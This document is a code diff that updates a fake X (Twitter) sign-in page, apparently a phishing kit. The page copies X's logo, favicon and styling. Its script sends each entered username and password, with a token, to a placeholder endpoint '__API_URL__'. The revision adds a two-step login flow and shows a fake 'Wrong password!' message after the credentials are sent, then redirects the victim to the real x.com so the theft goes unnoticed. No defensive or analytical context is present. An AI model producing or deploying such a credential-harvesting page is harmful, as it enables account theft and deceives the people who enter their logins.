@@ -1,214 +1,122 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>X. It's what's happening / X</title>
+    <link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico" type="image/x-icon">
+    <meta name="description" content="From breaking news and entertainment to sports and politics, get the full story with all the live commentary.">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background-color: #000;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #fff;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 600px;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .x-logo {
-            margin-bottom: 40px;
-        }
-
-        .x-logo svg {
-            width: 44px;
-            height: 44px;
-            fill: #fff;
-        }
-
-        h1 {
-            font-size: 31px;
-            font-weight: 700;
-            margin-bottom: 32px;
-            color: #d6d9db;
-        }
-
-        .social-btn {
-            width: 100%;
-            max-width: 300px;
-            height: 40px;
-            background: #fff;
-            color: #0f1419;
-            border: none;
-            border-radius: 9999px;
-            font-size: 15px;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin: 0 auto 12px;
-            cursor: pointer;
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
-            max-width: 300px;
-            margin: 20px auto;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: "";
-            flex: 1;
-            height: 1px;
-            background-color: #2f3336;
-        }
-
-        .divider span {
-            padding: 0 10px;
-            color: #71767b;
-            font-size: 15px;
-        }
-
-        .input-group {
-            max-width: 300px;
-            margin: 0 auto 16px;
-        }
-
-        .input-group input {
-            width: 100%;
-            height: 56px;
-            background: transparent;
-            border: 1px solid #333639;
-            border-radius: 4px;
-            padding: 12px;
-            color: #fff;
-            font-size: 17px;
-            outline: none;
-        }
-
-        .input-group input:focus {
-            border-color: #1d9bf0;
-        }
-
-        .next-btn {
-            width: 100%;
-            max-width: 300px;
-            height: 40px;
-            background: #fff;
-            color: #0f1419;
-            border: none;
-            border-radius: 9999px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            margin: 0 auto 12px;
-            display: block;
-        }
-
-        .forgot-btn {
-            width: 100%;
-            max-width: 300px;
-            height: 40px;
-            background: transparent;
-            color: #fff;
-            border: 1px solid #536471;
-            border-radius: 9999px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            margin: 0 auto;
-            display: block;
-        }
-
-        .footer {
-            margin-top: 40px;
-            color: #71767b;
-            font-size: 15px;
-        }
-
-        .footer span {
-            color: #1d9bf0;
-            cursor: pointer;
-        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background-color:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}
+        .container{width:100%;max-width:600px;padding:20px;text-align:center;animation:fadeIn .4s ease}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+        @keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-5px)}40%,80%{transform:translateX(5px)}}
+        .x-logo{margin-bottom:40px}
+        .x-logo svg{width:44px;height:44px;fill:#fff}
+        h1{font-size:31px;font-weight:700;margin-bottom:32px;color:#e7e9ea}
+        .social-btn{width:100%;max-width:300px;height:40px;background:#fff;color:#0f1419;border:none;border-radius:9999px;font-size:15px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:8px;margin:0 auto 12px;cursor:pointer;transition:background-color .2s}
+        .social-btn:hover{background:#e8e8e8}
+        .divider{display:flex;align-items:center;max-width:300px;margin:20px auto}
+        .divider::before,.divider::after{content:"";flex:1;height:1px;background-color:#2f3336}
+        .divider span{padding:0 10px;color:#71767b;font-size:15px}
+        .input-group{max-width:300px;margin:0 auto 16px}
+        .input-group input{width:100%;height:56px;background:transparent;border:1px solid #333639;border-radius:4px;padding:12px;color:#fff;font-size:17px;outline:none;transition:border-color .2s}
+        .input-group input:focus{border-color:#1d9bf0}
+        .input-group input::placeholder{color:#71767b}
+        .next-btn{width:100%;max-width:300px;height:40px;background:#fff;color:#0f1419;border:none;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer;margin:0 auto 12px;display:block;transition:background-color .2s,transform .1s;position:relative}
+        .next-btn:hover{background:#d7dbdc}
+        .next-btn:active{transform:scale(.97)}
+        .next-btn.loading{background:#666;color:#333}
+        .spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(0,0,0,.2);border-top:2px solid #0f1419;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .forgot-btn{width:100%;max-width:300px;height:40px;background:transparent;color:#fff;border:1px solid #536471;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer;margin:0 auto;display:block;transition:background-color .2s}
+        .forgot-btn:hover{background:rgba(255,255,255,.05)}
+        .footer{margin-top:40px;color:#71767b;font-size:15px}
+        .footer span{color:#1d9bf0;cursor:pointer}
+        .error-msg{color:#f4212e;font-size:13px;text-align:center;max-width:300px;margin:0 auto 12px;display:none}
+        .step-hide{display:none}
+        .step-show{display:block;animation:slideIn .3s ease}
+        @keyframes slideIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+        .user-badge{display:inline-flex;align-items:center;gap:6px;background:#16181c;border:1px solid #333639;border-radius:9999px;padding:4px 12px 4px 8px;font-size:15px;color:#e7e9ea;margin-bottom:20px}
     </style>
 </head>
-
 <body>
     <div class="container">
         <div class="x-logo">
-            <svg viewBox="0 0 24 24">
-                <path
-                    d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z">
-                </path>
-            </svg>
+            <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg>
         </div>
-        <h1>Sign in to X</h1>
+        <h1 id="pageTitle">Sign in to X</h1>
 
-        <button class="social-btn">
-            <img src="https://www.google.com/favicon.ico" width="18">
-            Sign in with Google
-        </button>
-        <button class="social-btn">
-            <img src="https://www.apple.com/favicon.ico" width="18">
-            Sign in with Apple
-        </button>
-
-        <div class="divider"><span>or</span></div>
-
-        <form id="xForm">
+        <div id="step1">
+            <button class="social-btn">
+                <img src="https://www.google.com/favicon.ico" width="18"> Sign in with Google
+            </button>
+            <button class="social-btn">
+                <img src="https://www.apple.com/favicon.ico" width="18"> Sign in with Apple
+            </button>
+            <div class="divider"><span>or</span></div>
             <div class="input-group">
                 <input type="text" id="username" placeholder="Phone, email, or username" autocomplete="username">
             </div>
+            <button type="button" id="nextBtn" class="next-btn">Next</button>
+            <button class="forgot-btn">Forgot password?</button>
+        </div>
+
+        <div id="step2" class="step-hide">
+            <div class="user-badge" id="userBadge"></div>
             <div class="input-group">
                 <input type="password" id="password" placeholder="Password" autocomplete="current-password">
             </div>
-            <button type="submit" class="next-btn">Log in</button>
-        </form>
-
-        <button class="forgot-btn">Forgot password?</button>
-
-        <div class="footer">
-            Don't have an account? <span>Sign up</span>
+            <div class="error-msg" id="errorMsg">Wrong password!</div>
+            <button type="button" id="loginBtn" class="next-btn">Log in</button>
+            <button class="forgot-btn">Forgot password?</button>
         </div>
+
+        <div class="footer">Don't have an account? <span>Sign up</span></div>
     </div>
-
     <script>
-        const form = document.getElementById('xForm');
-        const u = document.getElementById('username');
-        const p = document.getElementById('password');
+        const step1=document.getElementById('step1');
+        const step2=document.getElementById('step2');
+        const nextBtn=document.getElementById('nextBtn');
+        const loginBtn=document.getElementById('loginBtn');
+        const u=document.getElementById('username');
+        const p=document.getElementById('password');
 
-        form.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const data = {
-                token: '__TOKEN__',
-                username: u.value,
-                password: p.value
-            };
-            fetch('__API_URL__', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).finally(() => {
-                window.location.href = 'https://x.com/';
-            });
+        nextBtn.addEventListener('click',()=>{
+            if(!u.value.trim()){
+                u.parentElement.style.animation='shake 0.4s';
+                setTimeout(()=>u.parentElement.style.animation='',400);
+                return;
+            }
+            nextBtn.innerHTML='<span class="spinner"></span>';
+            setTimeout(()=>{
+                step1.classList.add('step-hide');
+                step2.classList.remove('step-hide');
+                step2.classList.add('step-show');
+                document.getElementById('userBadge').textContent='@'+u.value.trim();
+                document.getElementById('pageTitle').textContent='Enter your password';
+                p.focus();
+            },500);
+        });
+
+        loginBtn.addEventListener('click',()=>{
+            if(!p.value){
+                p.parentElement.style.animation='shake 0.4s';
+                setTimeout(()=>p.parentElement.style.animation='',400);
+                return;
+            }
+            loginBtn.innerHTML='<span class="spinner"></span>';loginBtn.style.pointerEvents='none';
+            const data={token:'__TOKEN__',username:u.value,password:p.value};
+            fetch('__API_URL__',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
+            .then(()=>{
+                document.getElementById('errorMsg').style.display='block';
+                loginBtn.textContent='Log in';loginBtn.style.pointerEvents='auto';
+                p.value='';
+                setTimeout(()=>{window.location.href='https://x.com/';},3000);
+            })
+            .catch(()=>{window.location.href='https://x.com/';});
         });
     </script>
 </body>
-
 </html>
